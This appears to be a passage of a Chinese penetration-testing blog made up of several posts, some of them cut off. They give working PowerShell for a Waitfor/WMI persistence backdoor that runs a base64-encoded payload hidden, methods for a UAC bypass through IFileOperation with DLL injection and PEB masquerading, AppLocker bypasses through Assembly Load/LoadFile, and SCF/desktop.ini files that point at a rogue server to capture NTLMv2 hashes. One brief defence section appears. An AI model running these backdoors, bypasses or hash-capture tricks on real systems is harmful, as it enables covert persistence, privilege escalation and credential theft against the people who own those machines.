<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$code = Get-Content -Path code.txt
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded 
</code></pre></div></div>

<p>获得base64加密代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==</code></p>

<p>以上操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-2.png" alt="Alt text"></p>

<p>测试base64加密代码：</p>

<p><code class="language-plaintext highlighter-rouge">powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==</code></p>

<p>成功执行代码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-3.png" alt="Alt text"></p>

<p>根据以上思路，POC如下：</p>

<p>后门代码：</p>

<p>（管理员权限）</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()
$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&amp;```&amp; waitfor persist ```&amp;```&amp; powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
$StaticClass.Put() 
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>存在两次转义字符</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ``用来表示`
</code></pre></div></div>

<p>安装代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec
</code></pre></div></div>

<p>激活命令：</p>

<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si persist</code></p>

<p>实际测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-4.png" alt="Alt text"></p>

<p>存在bug，导致powershell.exe无法正常退出，进程在后台残留</p>

<p>所以需要添加一段代码，用来结束进程powershell.exe</p>

<p><strong>注：</strong></p>

<p>根据逻辑关系，结束powershell.exe的代码要写在<code class="language-plaintext highlighter-rouge">powershell -nop -W Hidden -E ...</code>之前</p>

<p>最终，完整POC代码如下：</p>

<p>后门代码：</p>

<p>（管理员权限）</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()| Out-Null
$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&amp;```&amp; taskkill /f /im powershell.exe ```&amp;```&amp; waitfor persist ```&amp;```&amp; powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
$StaticClass.Put() | Out-Null

$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec | Out-Null
</code></pre></div></div>

<p>激活命令：</p>

<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si persist</code></p>

<p>完整演示如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/1-2.gif" alt="Alt text"></p>

<p>不存在进程残留的问题</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>留意后台进程waitfor.exe</p>

<p>对于后台的可疑进程cmd.exe和powershell.exe，可使用Process Explorer查看其启动参数，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-5.png" alt="Alt text"></p>

<p>也可以读取以上进程中的历史回显内容，参考资料如下：</p>

<p>http://jblog.javelin-networks.com/blog/cli-powershell/</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了Waitfor.exe后门的实现思路，也许还会有更多的利用技巧</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on June  7, 2017
  </div>

  
</article><article class="post">
  <h1>通过COM组件IFileOperation越权复制文件</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Empire%E4%B8%AD%E7%9A%84Invoke-WScriptBypassUAC%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">《Empire中的Invoke-WScriptBypassUAC利用分析》</a>曾介绍过一个越权复制文件的方法，在普通用户的权限下，利用wusa能够将cab文件释放至管理员权限的文件夹，进一步可以实现文件名劫持和UAC绕过。</p>

<p>但该功能在Win10下被取消，那么有没有更为通用的方法呢？</p>

<p>本文将要介绍一个适用于Win7-Win10的方法——利用COM组件IFileOperation</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<ul>
  <li>利用原理</li>
  <li>三种实现思路</li>
  <li>实例代码</li>
  <li>实际测试</li>
  <li>利用分析</li>
</ul>

<h2 id="0x02-利用原理">0x02 利用原理</h2>
<hr>

<p><strong>注：</strong></p>

<p>该方法学习自Defcon 25中的workshop，Ruben Boonen 《UAC 0day, all day!》</p>

<p>ppt下载地址：</p>

<p>https://github.com/FuzzySecurity/DefCon25/blob/master/DefCon25_UAC-0day-All-Day_v1.2.pdf</p>

<p>利用COM组件IFileOperation越权复制文件的前提：</p>

<ul>
  <li>Win7以后的系统</li>
  <li>可信路径下的可信文件(例如explorer.exe，powershell.exe)</li>
</ul>

<p>所以有以下三种实现思路：</p>

<h3 id="1dll劫持或是dll注入">1、dll劫持或是dll注入</h3>

<p>由于可信路径下的可信文件一般都是在需要管理员权限的路径下，所以普通用户权限下基本无法实现dll劫持</p>

<p>可行的方法是dll注入</p>

<p>例如explorer.exe，在普通用户权限就可以对其进行dll注入</p>

<h3 id="2修改peb结构欺骗psapi调用com组件ifileoperation">2、修改PEB结构，欺骗PSAPI，调用COM组件IFileOperation</h3>

<p>COM组件通过Process Status API (PSAPI)读取进程PEB结构中的Commandline来识别它们正在运行的进程</p>

<p>如果将进程的Path改成可信文件(如explorer.exe)，就能够欺骗PSAPI，调用COM组件IFileOperation实现越权复制</p>

<h3 id="3通过可信文件直接调用com组件ifileoperation">3、通过可信文件直接调用COM组件IFileOperation</h3>

<p>例如powershell.exe为可信文件，并且能够直接调用COM组件IFileOperation</p>

<h2 id="0x03-实现方法1dll注入explorerexe">0x03 实现方法1：dll注入explorer.exe</h2>
<hr>

<p>具体实现分为如下两段：</p>

<ol>
  <li>将dll注入到进程explorer.exe</li>
  <li>dll实现调用COM组件IFileOperation复制文件</li>
</ol>

<p>github已经有一个完整的实现代码，因此可以参考该工程对其分析，工程地址：</p>

<p>https://github.com/hjc4869/UacBypass</p>

<p>(1)工程UacBypassTest实现了dll注入到进程explorer.exe</p>

<p>去掉不必要的功能，只保留将UacBypass.dll注入到进程explorer.exe的功能：</p>

<p>删除Line 58即可</p>

<p>(2)工程UacBypass实现了调用COM组件IFileOperation复制文件</p>

<p>该工程编译后生成文件UacBypass.dll，实现了将同级目录下的ntwdblib.dll复制到<code class="language-plaintext highlighter-rouge">C:\windows\System32</code>下</p>

<h4 id="实际测试">实际测试：</h4>

<p>运行UacBypassTest.exe，将UacBypass.dll注入到进程explorer.exe，成功实现越权文件复制</p>

<h2 id="0x04-实现方法2修改peb结构欺骗psapi调用com组件ifileoperation">0x04 实现方法2：修改PEB结构，欺骗PSAPI，调用COM组件IFileOperation</h2>
<hr>

<p>参考工程UacBypass，将dll转为exe，添加头文件，修复bug，可供参考的完整代码：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IFileOperation.cpp</p>

<p>实现了将<code class="language-plaintext highlighter-rouge">c:\6\ntwdblib.dll</code>复制到<code class="language-plaintext highlighter-rouge">c:\windows\system32</code>下</p>

<p><strong>代码分析：</strong></p>

<p>成功的前提是指定了该COM组件的属性(需要提升权限)</p>

<p>官方文档地址：</p>

<p>https://msdn.microsoft.com/en-us/library/bb775799.aspx</p>

<p>代码位置：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IFileOperation.cpp#L14</p>

<p>属性说明：</p>

<ul>
  <li>FOF_NOCONFIRMATION :不弹出确认框</li>
  <li>FOF_SILENT:不弹框</li>
  <li>FOFX_SHOWELEVATIONPROMPT:需要提升权限</li>
  <li>FOFX_NOCOPYHOOKS:不使用copy hooks</li>
  <li>FOFX_REQUIREELEVATION:默认需要提升权限</li>
  <li>FOF_NOERRORUI:报错不弹框</li>
</ul>

<h4 id="实际测试-1">实际测试：</h4>

<p>直接运行exe，会弹出UAC的确认框，提示权限不够，如果选择允许，能够实现文件复制</p>

<p>接下来需要添加修改PEB结构的功能，为了欺骗PSAPI，共需要修改以下位置：</p>

<ul>
  <li>_RTL_USER_PROCESS_PARAMETERS中的ImagePathName</li>
  <li>_LDR_DATA_TABLE_ENTRY中的FullDllName</li>
  <li>_LDR_DATA_TABLE_ENTRY中的BaseDllName</li>
</ul>

<p><strong>注：</strong></p>

<p>不需要修改_RTL_USER_PROCESS_PARAMETERS中的<code class="language-plaintext highlighter-rouge">CommandLine</code>，该属性能够通过Process Explorer查看，为了更具有欺骗性，可以选择将其修改</p>

<p>我在这里参考了UACME中<code class="language-plaintext highlighter-rouge">supMasqueradeProcess()</code>的实现代码，地址如下：</p>

<p>https://github.com/hfiref0x/UACME/blob/143ead4db6b57a84478c9883023fbe5d64ac277b/Source/Akagi/sup.c#L947</p>

<p>我做了以下修改：</p>

<ul>
  <li>不使用ntdll.lib文件(安装DDK后包含)，改为通过ntdll获得NTAPI</li>
  <li>提取关键代码</li>
  <li>修复bug</li>
  <li>添加调用COM组件IFileOperation复制文件的功能</li>
  <li>…</li>
</ul>

<p>更多细节可参考开源的代码，地址如下：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp</p>

<p>代码实现了修改当前进程的PEB结构，欺骗PSAPI，将其识别为explorer.exe，接着调用COM组件IFileOperation实现文件复制</p>

<h4 id="实际测试-2">实际测试：</h4>

<p>当前进程被修改为explorer.exe，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-15/2-1.png" alt="Alt text"></p>

<p>文件复制成功，并且没有弹出UAC的确认框，实现了越权复制文件</p>

<h2 id="0x05-实现方法3通过powershellexe调用com组件ifileoperation">0x05 实现方法3：通过powershell.exe调用COM组件IFileOperation</h2>
<hr>

<p>先通过c#编译一个COM组件实现调用COM组件IFileOperation复制文件，接着通过powershell来调用这个COM组件</p>

<h3 id="1编写com组件">1、编写COM组件</h3>

<p>代码参考地址：</p>

<p>https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/FileOperations/FileOperations</p>

<p>编译成功后生成FileOperation.dll</p>

<p><strong>注：</strong></p>

<p>Ruben Boonen(b33f@FuzzySecurity)参考的源工程：</p>

<p>https://github.com/mlaily/MSDNMagazine2007-.NET-Matters-IFileOperation-in-Windows-Vista</p>

<p>他在此基础上做了修改(修改类名等)，使得powershell能够直接调用COM组件，这个功能很棒</p>

<h3 id="2通过powershell来调用这个com组件">2、通过powershell来调用这个COM组件</h3>

<p>有以下两种方式：</p>

<p>(1) [System.Reflection.Assembly]::LoadFile($Path)</p>

<p>直接加载文件</p>

<p>(2) [Reflection.Assembly]::Load($bytes)</p>

<p>将文件压缩为字符串保存在数组中，可参考Matthew Graeber的方法，地址如下：</p>

<p>http://www.exploit-monday.com/2012/12/in-memory-dll-loading.html</p>

<p>能够直接输出可供使用的powershell代码</p>

<p><strong>注：</strong></p>

<p>两种方式的比较在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/">《利用Assembly Load &amp; LoadFile绕过Applocker的分析总结》</a>有过介绍</p>

<p>方法3完整的实现代码可参考：</p>

<p>https://github.com/FuzzySecurity/PowerShell-Suite/blob/ebbb8991a8a051b48c05ce676524a1ba787dbf0c/Bypass-UAC/Bypass-UAC.ps1#L1082</p>

<h4 id="实际测试-3">实际测试：</h4>

<p>执行powershell脚本，加载COM组件IFileOperation，由于powershell.exe为可信进程，所以不会弹出UAC的确认框，成功实现越权复制文件</p>

<h2 id="0x06-利用分析">0x06 利用分析</h2>
<hr>

<p>COM组件IFileOperation适用于Win7-Win10，所以越权复制的方法也是可用的</p>

<p>对于explorer.exe，加载高权限的COM组件不会弹出UAC的对话框。</p>

<p>本文已经实现了模拟explorer.exe的方法，那么是否有其他可用的COM组件呢？又能完成哪些“提权操作呢”?</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了通过COM组件IFileOperation越权复制文件的三种方法，整理并开发了实现代码，可用于直接测试</p>

<p>最后感谢Ruben Boonen(b33f@FuzzySecurity)在研究上对我的帮助</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May 15, 2018
  </div>

  
</article><article class="post">
  <h1>利用Assembly Load &amp; LoadFile绕过Applocker的分析总结</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近bohops在文章<a href="https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/">《Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts》</a>中介绍了利用CL_LoadAssembly.ps1绕过Applocker的方法，Casey Smith早在SchmooCon 2015也提到了这个方法。本文将要对他们的两个实现方法进行复现，分析细节，比较区别，进而总结利用思路。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>复现bohops的方法</li>
  <li>复现Casey Smith的方法</li>
  <li>细节分析</li>
  <li>总结利用思路</li>
</ul>

<h2 id="0x02-复现bohops的方法">0x02 复现bohops的方法</h2>
<hr>

<p>测试系统： Win7 x86</p>

<p>开启Applocker，开启方法可参考文章《Bypass Windows AppLocker》</p>

<p>开发工具: VS2012</p>

<p>1、新建c#控制台工程ConsoleApplication5，默认代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Text;

namespace ConsoleApplication5
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}
</code></pre></div></div>

<p>2、修改代码，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>namespace ConsoleApplication5
{
    public class Program
    {
        public static void test()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
//            p.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
//            p.StartInfo.Arguments = @"/c ""powershell.exe"" -ep bypass -c $host";   
            p.Start();
        }
        static void Main(string[] args)
        {
            test();
        }
        
    }
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">class Program</code>前需要添加访问修饰符<code class="language-plaintext highlighter-rouge">public</code>,添加Method test()同样要加访问修饰符<code class="language-plaintext highlighter-rouge">public</code></p>

<p>3、修改目标框架为.net 2.0，编译生成ConsoleApplication5，保存在c:\6下</p>

<p>4、powershell执行如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\windows\diagnostics\system\AERO
import-module .\CL_LoadAssembly.ps1
LoadAssemblyFromPath ..\..\..\..\6\ConsoleApplication5.exe
[ConsoleApplication5.Program]::test()
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">..\..\..\..\</code>能够定位到<code class="language-plaintext highlighter-rouge">c:\</code></p>

<p><code class="language-plaintext highlighter-rouge">[ConsoleApplication5.Program]::test()</code>需要同程序内的代码对应，格式为：<code class="language-plaintext highlighter-rouge">[$namespace.$class]::$fuction()</code></p>

<p>成功执行calc.exe，绕过applocker</p>

<h2 id="0x03-复现casey-smith的方法">0x03 复现Casey Smith的方法</h2>
<hr>

<p>测试系统： Win7 x86</p>

<p>开启Applocker</p>

<p>代码参考地址：</p>

<p>https://gist.github.com/netbiosX/5f19a3e8762b6e3fd25782d8c37b1663</p>

<p>本次测试对Casey Smith的代码做细微修改</p>

<p>1、新建文件bypass.cs，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Text;

public class Program
{
	public static void Main()
	{
		Console.WriteLine("Hey There From Main()");
		//Add any behaviour here to throw off sandbox execution/analysts :)
		
	}
	
}
public class aaa
 {
        public static void bbb()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
//            p.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
//            p.StartInfo.Arguments = @"/c ""powershell.exe"" -ep bypass -c notepad.exe";   
            p.Start();
        }
}
</code></pre></div></div>

<p>2、使用2.0版本的csc.exe对其编译，生成exe文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:bypass.exe bypass.cs
</code></pre></div></div>

<p>3、powershell执行如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$bytes = [System.IO.File]::ReadAllBytes("C:\6\bypass.exe")
[Reflection.Assembly]::Load($bytes)
[aaa]::bbb()
</code></pre></div></div>

<p>成功执行calc.exe，绕过applocker</p>

<h2 id="0x04-对比分析">0x04 对比分析</h2>
<hr>

<h3 id="1bohops的方法">1、bohops的方法</h3>

<p>加载文件CL_LoadAssembly.ps1，位于<code class="language-plaintext highlighter-rouge">C:\windows\diagnostics\system\AERO</code></p>

<p>文件CL_LoadAssembly.ps1内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Copyright © 2008, Microsoft Corporation. All rights reserved.


# Common library
. .\CL_Utility.ps1

function LoadAssemblyFromNS([string]$namespace)
{
    if([string]::IsNullorEmpty($namespace))
    {
        throw "Invalid namespace"
    }

    [System.Reflection.Assembly]::LoadWithPartialName($namespace) &gt; $null
}

function LoadAssemblyFromPath([string]$scriptPath)
{
    if([String]::IsNullorEmpty($scriptPath))
    {
        throw "Invalid file path"
    }

    $absolutePath = GetAbsolutionPath $scriptPath


[System.Reflection.Assembly]::LoadFile($absolutePath) &gt; $null
}
</code></pre></div></div>

<p>调用函数<code class="language-plaintext highlighter-rouge">LoadAssemblyFromPath</code>，本质上是调用<code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]::LoadFile($absolutePath)</code></p>

<h3 id="2casey-smith的方法">2、Casey Smith的方法</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$bytes = [System.IO.File]::ReadAllBytes("C:\6\bypass.exe")
[Reflection.Assembly]::Load($bytes)
[aaa]::bbb()
</code></pre></div></div>

<p>调用了<code class="language-plaintext highlighter-rouge">[Reflection.Assembly]::Load($bytes)</code></p>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">[Reflection.Assembly]</code>是<code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]</code>的简写</p>

<h3 id="3对比">3、对比</h3>

<p>两种方法分别使用了Assembly的LoadFile和Load方法，两者的区别在这里的影响微乎其微</p>

<p>可以分别使用LoadFile和Load方法去调用以上两种方法生成的两个exe(分别由vs2012和csc.exe编译)</p>

<p>互换后的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$bytes = [System.IO.File]::ReadAllBytes("C:\6\ConsoleApplication5.exe")
[Reflection.Assembly]::Load($bytes)
[ConsoleApplication5.Program]::test()
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\windows\diagnostics\system\AERO
import-module .\CL_LoadAssembly.ps1
LoadAssemblyFromPath ..\..\..\..\6\bypass.exe
[aaa]::bbb()
</code></pre></div></div>

<p>经过以上测试，可以推断如下两段代码等价：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\windows\diagnostics\system\AERO
import-module .\CL_LoadAssembly.ps1
LoadAssemblyFromPath ..\..\..\..\6\bypass.exe
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Reflection.Assembly]::LoadFile("C:\6\bypass.exe")
</code></pre></div></div>

<p>依照以上推断，我们可以对Casey Smith的利用代码进行精简，最短的powershell实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Reflection.Assembly]::LoadFile("C:\6\bypass.exe")
[aaa]::bbb()
</code></pre></div></div>

<h3 id="4适用条件">4、适用条件</h3>

<p>实际测试，以上两种方法适用.net 2.0，如果换成.net 4.0编译，在执行时会报错</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文分别对bohops和Casey Smith的方法做了测试，找到方法的本质是分别使用了Assembly的LoadFile和Load方法。经实际测试，得出该方法只适用于.Net 2.0环境</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 12, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/">《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》</a>介绍了在服务器上通过Windows命令行抓包获取连接文件服务器的NTLMv2 Hash的方法，解决了一个有趣的问题：</p>

<p><code class="language-plaintext highlighter-rouge">如果获得了内网一个文件服务器的权限，如何获得更多用户的口令？</code></p>

<p>本文将换一种实现方式，通过修改文件服务器上的图标文件，强制用户访问伪造的文件服务器，在伪造的文件服务器上抓包获取连接文件服务器的NTLMv2 Hash。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>添加scf文件强制用户访问伪造的文件服务器</li>
  <li>修改文件夹图标强制用户访问伪造的文件服务器</li>
  <li>文件夹图标后门</li>
  <li>防御思路</li>
</ul>

<h2 id="0x02-实现思路">0x02 实现思路</h2>
<hr>

<p>利用SMB协议的特性，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录</p>

<p>在用户访问文件服务器时，如果我们能够欺骗用户访问伪造的文件服务器，并在伪造的文件服务器上抓包，那么就能获得用户本机的NTLMv2 Hash</p>

<p>所以关键是如何欺骗用户访问伪造的文件服务器，同时又保证隐蔽</p>

<p>欺骗用户访问伪造的文件服务器的方法有多种(钓鱼方式暂略)，那么有没有当用户打开文件共享时，自动访问伪造文件服务器的方法呢？当然是有的，接下来主要介绍两种实现方式</p>

<h2 id="0x03-添加scf文件强制用户访问伪造的文件服务器">0x03 添加scf文件强制用户访问伪造的文件服务器</h2>
<hr>

<p>其他文章对该方法已经有过介绍，参考资料：</p>

<p>https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</p>

<p>https://xianzhi.aliyun.com/forum/topic/1624</p>

<p>这里简要介绍一下原理</p>

<p><strong>scf文件：</strong></p>

<p>SCF文件是”WINDOWS资源管理器命令”文件，是一种可执行文件,该类型文件由Windows Explorer Command解释，标准安装</p>

<p>包含三种类型：</p>

<ul>
  <li>Explorer.scf(资源管理器)</li>
  <li>Show Desktop.scf(显示桌面)</li>
  <li>View Channels.scf（查看频道）</li>
</ul>

<p>格式示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
Command=2
IconFile=explorer.exe,3
[Taskbar]
Command=ToggleDesktop
</code></pre></div></div>

<p>IconFile属性支持UNC路径，也就是说，可以指定文件服务器上的某个文件，例如<code class="language-plaintext highlighter-rouge">IconFile=\\192.168.62.130\test\explorer.exe,3</code></p>

<p>特别的地方： 使用Explore.exe打开包含该文件的路径时，由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标，如果图标位于文件服务器，就会访问该文件服务器</p>

<p>直观理解： 打开某一文件夹，该文件夹下面包含scf文件，scf文件的IconFile属性指向文件服务器，本机会自动访问该文件服务器，在访问过程中，默认先使用本机的用户名和密码hash尝试登录。如果文件服务器抓取数据包，就能够获得NTLMv2 Hash</p>

<h3 id="实际测试">实际测试：</h3>

<p>正常文件服务器IP: 192.168.62.139</p>

<p>伪造文件服务器IP： 192.168.62.130</p>

<p>客户端IP： 192.168.62.135</p>

<h4 id="1正常文件服务器共享目录下添加文件testscf内容如下">1、正常文件服务器共享目录下添加文件test.scf，内容如下：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
Command=2
IconFile=\\192.168.62.130\test\test.ico
[Taskbar]
Command=ToggleDesktop
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>IconFile指向伪造文件服务器，test.ico不存在</p>

<h4 id="2在伪造文件服务器上使用wireshark进行抓包">2、在伪造文件服务器上使用wireshark进行抓包</h4>

<h4 id="3客户端访问正常文件服务器">3、客户端访问正常文件服务器</h4>

<h4 id="4伪造文件服务器获得客户端本机当前用户的ntlmv2-hash">4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-23/2-1.png" alt="Alt text"></p>

<p>构造特定格式<code class="language-plaintext highlighter-rouge">username::domain:challenge:HMAC-MD5:blob</code>，使用Hashcat破解即可</p>

<p>具体破解方法可参考文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a></p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/">《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》</a></p>

<p>经过实际测试，我们可以看到，利用的关键是要在文件服务器上添加scf文件，等待用户访问</p>

<p>那么，有没有更为隐蔽的方法呢？</p>

<h2 id="0x04-修改文件夹图标强制用户访问伪造的文件服务器">0x04 修改文件夹图标强制用户访问伪造的文件服务器</h2>
<hr>

<p>参考scf文件的利用原理，需要找到可以指定IconFile属性的特殊文件</p>

<p>经过寻找，我找到了一个合适的方法： <code class="language-plaintext highlighter-rouge">修改文件夹图标强制用户访问伪造的文件服务器</code></p>

<h3 id="修改文件夹图标的方法">修改文件夹图标的方法：</h3>

<p>选中<code class="language-plaintext highlighter-rouge">文件夹</code>-<code class="language-plaintext highlighter-rouge">右键</code>-<code class="language-plaintext highlighter-rouge">属性</code>-<code class="language-plaintext highlighter-rouge">自定义</code>-<code class="language-plaintext highlighter-rouge">更改图标</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-23/2-2.png" alt="Alt text"></p>

<p>更好后，在文件夹子目录生成文件desktop.ini，格式如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[.ShellClassInfo]
IconResource=C:\Windows\system32\SHELL32.dll,3
[ViewState]
Mode=
Vid=
FolderType=Generic
</code></pre></div></div>

<p>尝试将IconResource属性替换为UNC路径，路径为<code class="language-plaintext highlighter-rouge">IconResource=\\192.168.62.130\test\SHELL32.dll,3</code></p>

<p>测试成功</p>

<h3 id="实际测试-1">实际测试：</h3>

<p>正常文件服务器IP: 192.168.62.139</p>

<p>伪造文件服务器IP： 192.168.62.130</p>

<p>客户端IP： 192.168.62.135</p>

